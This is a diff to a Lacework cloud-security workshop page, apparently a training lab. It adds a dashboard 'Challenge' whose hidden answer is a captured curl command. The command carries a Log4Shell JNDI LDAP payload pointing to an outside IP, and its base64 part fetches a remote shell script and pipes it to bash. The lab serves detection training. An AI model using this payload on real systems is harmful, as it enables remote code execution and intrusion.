@@ -28,3 +28,7 @@ By default, the graph displays up to five event types. The listed order of the e
 ![Lacework Compliance Events](/images/lacework-compliance-events.png)
 
 The _Global Dashboard_ provides a quick view of your cloud security posture. It gives you a summary of your security data, trends and events.
+
+***
+# Challenge
+{{%expand "In the Host Events pane, click through the New Application events to see what types of applications were launched. Select the curl event and explore the details. Can you find the curl command that was executed?" %}} curl -v http://a7aedb671d05b4dc996f3243e1ca253e-1577402981.us-west-2.elb.amazonaws.com:8080 -H X-Api-Version:${jndi:ldap://93.189.42.8:5557/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo} {{% /expand%}}
